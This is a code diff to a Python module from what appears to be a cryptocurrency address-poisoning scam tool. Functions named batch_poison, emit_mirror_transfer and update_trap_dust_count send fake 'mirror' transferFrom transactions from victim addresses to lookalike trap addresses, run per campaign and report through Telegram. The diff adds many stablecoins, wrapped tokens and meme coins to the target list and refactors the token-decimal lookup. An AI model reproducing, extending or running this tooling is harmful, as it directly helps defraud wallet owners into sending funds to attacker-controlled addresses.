@@ -284,19 +284,130 @@ ALCHEMY_RPCS = {
 
 
 # ─── Mirror Token Contracts ───
+# Stablecoins
 MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
 MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
+MIRROR_TOKEN_DAI = os.getenv("MIRROR_TOKEN_DAI")
+MIRROR_TOKEN_EURC = os.getenv("MIRROR_TOKEN_EURC")
+MIRROR_TOKEN_EURCV = os.getenv("MIRROR_TOKEN_EURCV")
+
+# Wrapped tokens
+MIRROR_TOKEN_WBTC = os.getenv("MIRROR_TOKEN_WBTC")
+MIRROR_TOKEN_cbETH = os.getenv("MIRROR_TOKEN_cbETH")
+
+# DeFi tokens
+MIRROR_TOKEN_LINK = os.getenv("MIRROR_TOKEN_LINK")
+MIRROR_TOKEN_AAVE = os.getenv("MIRROR_TOKEN_AAVE")
+MIRROR_TOKEN_ENA = os.getenv("MIRROR_TOKEN_ENA")
+MIRROR_TOKEN_CHEX = os.getenv("MIRROR_TOKEN_CHEX")
+
+# Meme coins
+MIRROR_TOKEN_SHIB = os.getenv("MIRROR_TOKEN_SHIB")
+MIRROR_TOKEN_PEPE = os.getenv("MIRROR_TOKEN_PEPE")
+MIRROR_TOKEN_DOGE = os.getenv("MIRROR_TOKEN_DOGE")
+MIRROR_TOKEN_BONK = os.getenv("MIRROR_TOKEN_BONK")
+
+# Other tokens
+MIRROR_TOKEN_WLFI = os.getenv("MIRROR_TOKEN_WLFI")
+MIRROR_TOKEN_HEX = os.getenv("MIRROR_TOKEN_HEX")
+MIRROR_TOKEN_CRCLon = os.getenv("MIRROR_TOKEN_CRCLon")
+
+# Native coins
 MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")
 
 MIRROR_CONTRACTS = {
+    # Stablecoins
     "USDC": MIRROR_TOKEN_USDC,
     "USDT": MIRROR_TOKEN_USDT,
+    "DAI": MIRROR_TOKEN_DAI,
+    "EURC": MIRROR_TOKEN_EURC,
+    "EURCV": MIRROR_TOKEN_EURCV,
+    
+    # Wrapped tokens
+    "WBTC": MIRROR_TOKEN_WBTC,
+    "cbETH": MIRROR_TOKEN_cbETH,
+    
+    # DeFi tokens
+    "LINK": MIRROR_TOKEN_LINK,
+    "AAVE": MIRROR_TOKEN_AAVE,
+    "ENA": MIRROR_TOKEN_ENA,
+    "CHEX": MIRROR_TOKEN_CHEX,
+    
+    # Meme coins
+    "SHIB": MIRROR_TOKEN_SHIB,
+    "PEPE": MIRROR_TOKEN_PEPE,
+    "DOGE": MIRROR_TOKEN_DOGE,
+    "BONK": MIRROR_TOKEN_BONK,
+    
+    # Other tokens
+    "WLFI": MIRROR_TOKEN_WLFI,
+    "HEX": MIRROR_TOKEN_HEX,
+    "CRCLon": MIRROR_TOKEN_CRCLon,
+    
+    # Native coins (all use the same contract)
     "ETH": MIRROR_TOKEN_NATIVE,
     "BNB": MIRROR_TOKEN_NATIVE,
     "MATIC": MIRROR_TOKEN_NATIVE,
 }
 
 MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
+
+def get_token_decimals(asset_symbol):
+    """Get the correct number of decimals for a token symbol."""
+    decimals_map = {
+        # Native coins (18 decimals)
+        'ETH': 18,
+        'BNB': 18,
+        'MATIC': 18,
+        'WETH': 18,
+        'WBNB': 18,
+        'WMATIC': 18,
+        
+        # Stablecoins with 6 decimals
+        'USDC': 6,
+        'USDT': 6,
+        'EURC': 6,
+        'USDP': 6,
+        'BUSD': 6,
+        
+        # Stablecoins with 18 decimals
+        'DAI': 18,
+        'EURCV': 18,
+        'TUSD': 18,
+        'FRAX': 18,
+        
+        # Bitcoin variants (8 decimals)
+        'WBTC': 8,
+        'renBTC': 8,
+        
+        # DeFi tokens (18 decimals)
+        'LINK': 18,
+        'AAVE': 18,
+        'ENA': 18,
+        'CHEX': 18,
+        'cbETH': 18,
+        
+        # Meme coins
+        'SHIB': 18,
+        'PEPE': 18,
+        'DOGE': 18,
+        'BONK': 5,  # BONK uses 5 decimals
+        
+        # Other tokens
+        'WLFI': 18,
+        'HEX': 8,  # HEX uses 8 decimals
+        'CRCLon': 18,
+    }
+    
+    symbol = asset_symbol.upper()
+    decimals = decimals_map.get(symbol)
+    
+    if decimals is None:
+        logger.warning(f"Unknown token '{asset_symbol}', defaulting to 18 decimals")
+        return 18
+    
+    return decimals
+
 
 # Mirror uses the campaign funding wallet as operator (same as re_poison.js)
 def get_mirror_operator_key(campaign_id):
@@ -1032,13 +1143,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             if trap_id:
                 update_trap_dust_count(trap_id)
             
-            # Send individual Telegram notification for each successful mirror
-            try:
-                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
-                if hasattr(config, 'get_token_decimals'):
-                    decimals = config.get_token_decimals().get(fetched_asset, decimals)
-            except AttributeError:
-                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
+              # Send individual Telegram notification for each successful mirror
+            decimals = get_token_decimals(fetched_asset)
             
             amount_display = fetched_amount / (10 ** decimals)
             success_msg = (
@@ -1154,10 +1260,7 @@ if __name__ == "__main__":
         tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
 
         if tx_hash:
-            try:
-                decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
-            except AttributeError:
-                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
+            decimals = get_token_decimals(fetched_asset)
 
             amount_display = fetched_amount / (10 ** decimals)
             success_msg = (
